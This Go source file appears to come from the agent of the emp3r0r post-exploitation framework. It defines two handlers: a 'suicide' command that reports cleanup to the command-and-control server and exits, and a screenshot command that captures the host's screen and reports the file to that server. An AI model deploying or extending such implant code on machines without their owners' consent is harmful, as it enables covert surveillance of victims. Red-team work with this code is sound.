package handler

import (
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
	"github.com/spf13/cobra"
)

// suicideCmdRun deletes agent files and exits.
func suicideCmdRun(cmd *cobra.Command, args []string) {
	if len(args) != 0 {
		c2transport.NotifyC2(cmd, "args error: %v", args)
		return
	}
	// No AgentRoot to clean up anymore
	c2transport.NotifyC2(cmd, "Cleanup successful, exiting")
	logging.Println("Exiting...")
	os.Exit(0)
}

// screenshotCmdRun takes a screenshot and returns its path.
func screenshotCmdRun(cmd *cobra.Command, args []string) {
	out, err := modules.Screenshot()
	if err != nil || out == "" {
		c2transport.NotifyC2(cmd, "Error: failed to take screenshot: %v", err)
		return
	}
	// Keep screenshot in current directory or move to a system temp dir
	c2transport.NotifyC2(cmd, "%s", out)
}
